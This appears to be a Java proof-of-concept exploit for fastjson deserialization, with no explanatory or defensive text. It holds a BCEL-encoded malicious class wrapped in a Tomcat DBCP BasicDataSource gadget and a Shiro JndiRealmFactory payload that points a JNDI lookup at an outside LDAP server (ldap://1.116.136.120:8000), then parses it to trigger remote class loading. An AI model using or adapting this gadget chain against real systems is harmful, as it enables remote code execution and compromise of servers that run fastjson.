package com.xyb.java.exp;

import com.alibaba.fastjson.JSON;

public class exp {
    public static void main(String[] args) {
        String data = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dT$5bw$gU$U$feN$Gf$e8tR$I$NIh$83$b7j$L$89$v$de5$97FKL$z$NibI$89$98h$j$86$d3t$w$cc$b0$60p$a1$7f$c6G_$db$X$d2e$5c$f6$ddg$7f$8f$f1$3b$T$S$93$8a$975$b09g$df$be$bd$bf$bd$99$df$fe$f8$f9W$A$ef$a1nb$S$f31$y$YX4$b1$84$hJ$y$9b$f8$Y$9f$98$d0pS$89$82$81$V$T$e70$af$c4$a7$GVMX$b8$a5$$$9f$v$f3m$DE$T$J$dc$89a$cd$c4$EJ$ea$b2$ae$c4$5d$D$h$G6$FFdO$mYzl$7fg$e7$h$b6$b7$97$_$Hm$d7$db$5b$U$Y$5d$f1$bdN$60$7bA$c5nt$a5$80$be$e4zn$b0$y$a0es$V$81$c8$8a_$a76$5er$3dy$b7$db$ac$c9$f6$96$5dkH$95$ccw$ecF$c5n$bb$ea$3ePF$82GnG$e0R$c9$f1$9b$f9$de$f7$b5$7c$I$u$7b$ad$fcj$af$d5$f0$dd$80$80$R$d9$93$8e$c0$d5$ec$df$ab$c9$N$xP0$a1$d6$90$kOE$B$a3$d6$7dXv$7fP$85$f2$f4P$b6$d9$dbN$81$k5$F$9c9J$e0$fa$f9Bh$94$f5$a2$d7$ea$G$cc$r$ed$a6$ca$c5$b8$d4$v$90$d5$9e$p$5b$81$eb$7b$b4iN$b3N$3a$ca$81$ed$7c$bbn$b7$c2$8eH$b5$81$i$tC$86$F$cc$TwB$r$d6e$f0$c8$afo$dam$bb$v$D$d9$a6$w$b6$e44$G$e4$99e$bf$dbv$e4$zW$b1b$N$9a$bf$ae$80$z$5c$c6$b4$A$E$$$ffK$ad$G$3e$b7p$Pe$L$afa$cb$c0$7d$L$Vl$ab$d0$_$yT$f1$a5$c0$e4$8bL$V$ban$a3$$$db$Wv$b0$cb$ea$5e4$ab$d8$af$y$7c$8d$H$W$beQ$F$5c$i$c2$82$F$h$P8$n$O$d6Q$c8WTT$cd$82$a3$C$a6$fei$a6g$d06j$8f$a5C$d5$d8_$aa$7b$5d$_p$9b$e4$c1$dc$93$c1$c9$r$95$3d$3d$ed$81$9ac$b8$f6$l$7b$b1$d9$f6$j$d9$e9$y$9e$81$Y$u$F$$$Q$e2$U$8d$e4$e9$Y$86$3c$9f$dd$85tv$a8$a1$Yn$3d$8f$5c$G$p$bbS$u$Ws$i$bdn$b7Z$d2$a3j$ee$7f$ad$ed$60$Y$8b$t$v$983$W$f8GF$81$f1$ec$d0M$8f$3a$N$bf3$e0i$9d$ed$d8$7b$nOC$A$99$$$de$e21$I$b7u$abm$3b$S$af$f2$9f$3f$J$b5X$970$85t$f8$L$8c$f0$d1$d4$b2a$9a2CM$9e$bf$dc$3fDg$f6$n$9e$86$$$_Q$ea$a1R$c7$cb$94$d6$91$D$5eaR$f0$z$c3M$60$S$G$8b9z$e8$d4$ed$sGJc$J$yg$7e$89$zD$O$a0U$9f$n2$d3G$b4$P$3d$b3$Pc$n$9a$8e$a6$pZ$a6$8fX$f5$c6$c8$8f$b8r$80s$d5$7d$98$b3$7d$9c$3f$80U$a5mz$l$a3$bc$f5q$a1$f4$d3$e1$efiF$c6g$9f$94$e80$f6$qD$bf$cf$8dO$QU$d56$D$932$c9$db8$M$a4X$df$Ek$9bd$xS$d8$60$ab$5bl$b5$c2$W$b7$d9$a4$aa$ff6$bd4$94$f1zH$c3$y$9f7p$95$7d$f2m$88k$3ci$ccp$HY$e4$Qa$9e$P$98$7f$96$ddn$f3$fb$s$e6B$f4$5d$5cg$ac$o$L$98$87vH7$dd$c0$5b$fc$40$Yx$db$c0$3b$c0$n$7d$GJqJ$a9$x$8f$d0$ed$5d$be$deA$I$feA$f0$be$oT0$C$88$R$f1x$Y$cdp8$40$w$99$7c$86$8bk$HHT9$96$f1$e7k$q3$f544$c5$f9$i$T1$c1$SA2t$9c$a7$d6$a2$7e$94$94$c4$c3$a6$t$d8$a0$ceaM$85$85$t$88$ab$9a9j$815m$a8z$E$3e$M$H$fe$d1$9f$3b$G$82$cc$7f$G$A$A";
        String payload = "{\n" +
                "  \"@type\" : \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                "  \"driverClassName\" : \""+data+"\",\n" +
                "  \"driverClassLoader\" :\n" +
                "  {\n" +
                "    \"@type\":\"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;\"\n" +
                "  }\n" +
                "}";
        String exp = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\",\"jndiNames\":[\"ldap://1.116.136.120:8000/test\"],\"Realms\":[\"\"]}";
        JSON.parse(exp);
    }
}
